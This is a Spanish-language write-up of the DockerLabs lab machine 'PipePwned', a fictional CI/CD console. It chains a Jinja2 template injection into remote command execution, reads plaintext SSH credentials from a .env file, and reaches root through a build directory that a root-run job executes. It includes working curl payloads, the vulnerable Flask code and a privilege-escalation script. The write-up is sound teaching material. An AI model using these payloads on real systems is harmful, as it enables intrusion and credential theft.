# PipePwned

En este writeup resolvemos la máquina PipePwned de DockerLabs, que simula la consola CI/CD interna de la empresa ficticia MASoftware. Partimos de un único host (`172.17.0.2`) sin credenciales ni acceso previo, y seguimos el proceso completo: reconocimiento, explotación de la aplicación web, recuperación de credenciales, movimiento lateral y escalada de privilegios hasta root.

El objetivo no es solo comprometer la máquina, sino entender por qué cada fallo permite avanzar al siguiente: cómo una única inyección de plantilla acaba encadenándose con unos secretos mal ubicados y un proceso privilegiado mal configurado hasta darnos control total del host.

---

## Enumeración inicial

Escaneamos el objetivo y encontramos dos puertos abiertos: `22/tcp` con OpenSSH 8.9p1 (Ubuntu) y `80/tcp` sirviendo una aplicación Gunicorn/Flask.

El puerto 80 aloja una consola CI/CD de una sola página. Identificamos sus endpoints: `/`, `/pipelines/new` (POST), `/api/jobs/<id>/trace`, `/api/pipelines` y `/health`. El fuzzing de directorios con ffuf (diccionario `dirb/common.txt`) solo añade `/health` a las rutas ya conocidas: no hay panel de administración, ni `.git`, ni `.env` accesible directamente por HTTP. nuclei no devuelve hallazgos, lo cual es esperable al ser una aplicación a medida sin CVEs de catálogo.

El punto interesante es el formulario "Send New Pipeline" de la página principal, que envía un `POST /pipelines/new` con los campos `name` y `ref` y refleja ambos en la página de confirmación. Ese reflejo de entrada del usuario es lo que vamos a atacar.

---

## Confirmación de la SSTI

Para comprobar si la aplicación evalúa nuestra entrada como plantilla, enviamos `{{7*7}}` en el campo `name`:

```bash
curl -s -X POST http://172.17.0.2/pipelines/new \
  --data-urlencode "name={{7*7}}" \
  --data-urlencode "ref=main" | grep -A2 "Pipeline Result"
```

```
<p class="banner">Pipeline <strong>49</strong> sent to queue for ref <code>main</code> ...
```

La respuesta devuelve `49` en lugar de `{{7*7}}`. Esto confirma una **inyección de plantilla del lado del servidor (SSTI)**: nuestra entrada se está compilando y ejecutando como plantilla Jinja2 en el servidor.

La causa raíz está en el handler de `/pipelines/new` en `app.py`, que construye el banner concatenando la entrada del usuario directamente en una cadena y luego la pasa entera por `render_template_string()`:

```python
banner = (
    "Pipeline <strong>" + name + "</strong> sent to queue for ref "
    "<code>" + ref + "</code> on runner <em>self-hosted-01</em>."
)
message = render_template_string(banner)   # la entrada del usuario se recompila como plantilla Jinja2
```

Como `name` y `ref` se concatenan en el argumento antes de compilarlo, cualquier sintaxis Jinja2 que enviemos (`{{ ... }}`) se evalúa en el servidor. Además, el sandbox de Jinja2 no se aplica aquí, lo que abre la puerta a la ejecución de comandos.

---

## De SSTI a RCE

Aprovechamos que el modelo de objetos de Python permite, desde cualquier objeto integrado, recorrer el árbol de clases hasta llegar a `os` mediante `__class__.__init__.__globals__`, alcanzando `os.popen()` y ejecutando comandos arbitrarios. Enviamos un payload de escape del sandbox que ejecuta `id`:

```bash
curl -s -X POST http://172.17.0.2/pipelines/new \
  --data-urlencode "name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}" \
  --data-urlencode "ref=main"
```

```
<strong>uid=1000(ciapp) gid=1000(ciapp) groups=1000(ciapp)
</strong>
```

La salida de `id` confirma **ejecución remota de comandos como el usuario `ciapp`**, sin autenticación ni interacción previa.

---

## Recuperación de credenciales

Con el RCE, leemos el fichero `/opt/ci/.env`, que es propiedad de `ciapp` y por tanto legible por el proceso de la aplicación web:

```bash
curl -s -X POST http://172.17.0.2/pipelines/new \
  --data-urlencode "name={{config.__class__.__init__.__globals__['os'].popen('cat /opt/ci/.env').read()}}" \
  --data-urlencode "ref=main"
```

```
DEVOPS_SSH_USER=devops
DEVOPS_SSH_PASS=MAS0ftware_202607!
```

El `.env` contiene, en texto plano, las credenciales SSH de una segunda cuenta con más privilegios: `devops`.

---

## Movimiento lateral por SSH

Usamos las credenciales recuperadas para autenticarnos por SSH como `devops` y confirmar el acceso leyendo la flag de usuario:

```bash
python3 -c "
import paramiko
c = paramiko.SSHClient()
c.set_missing_host_key_policy(paramiko.AutoAddPolicy())
c.connect('172.17.0.2', username='devops', password='MAS0ftware_202607!')
print(c.exec_command('id; cat /home/devops/user_flag.txt')[1].read().decode())
"
```

```
uid=1001(devops) gid=1001(devops) groups=1001(devops)
30e3108dbbf867259a30a459770dd25c
```

Ya somos `devops` y tenemos la flag de usuario.

---

## Escalada de privilegios

El usuario `devops` pertenece al grupo `devops`, que tiene permiso de escritura sobre `/opt/ci/builds`. Ese directorio es sondeado y ejecutado por `/opt/ci/runner.sh`, un proceso que corre como root. La combinación es directa: si podemos escribir un script en ese directorio, el runner lo ejecutará con privilegios de root.

Depositamos un script vía SFTP como `devops`, esperamos a que el runner lo recoja y leemos su salida:

```bash
# como devops, por SFTP:
cat > job_test.sh <<'EOF'
#!/bin/bash
id > /tmp/priv_test.txt
cat /root/root_flag.txt >> /tmp/priv_test.txt
EOF
sftp devops@172.17.0.2 <<SFTP
put job_test.sh /opt/ci/builds/job_test.sh
chmod 777 /opt/ci/builds/job_test.sh
SFTP
sleep 10
ssh devops@172.17.0.2 "cat /tmp/priv_test.txt"
```

```
uid=0(root) gid=0(root) groups=0(root)
root
cff89c3a4ea6977b2213c344a4a84650
```

El runner recoge el script, lo ejecuta como root y lo mueve a `/opt/ci/builds/.processed/` en unos diez segundos. La salida `uid=0(root)` y la lectura de la flag de root confirman el compromiso total del host.

---

## Conclusión

PipePwned encadena tres fallos que, individualmente serios, juntos permiten pasar de una petición HTTP sin autenticación a root en menos de un minuto de explotación activa:

1. Una **SSTI** en `/pipelines/new` provocada por pasar entrada de usuario concatenada a `render_template_string()`, que da RCE como `ciapp`.
2. Unos **secretos en texto plano** en un `.env` legible por la propia aplicación web, que convierten el RCE en movimiento lateral hacia `devops`.
3. Un **proceso runner corriendo como root** que ejecuta scripts de un directorio donde escribe un grupo sin privilegios, convirtiendo la pertenencia a ese grupo en root.

La máquina refuerza una idea clave: la gravedad real no está solo en el fallo inicial, sino en cómo la exposición de secretos y una configuración de privilegios laxa permiten encadenar un RCE de bajo privilegio hasta el compromiso completo del sistema.

⚠️ Realizado con fines educativos y en un entorno controlado.
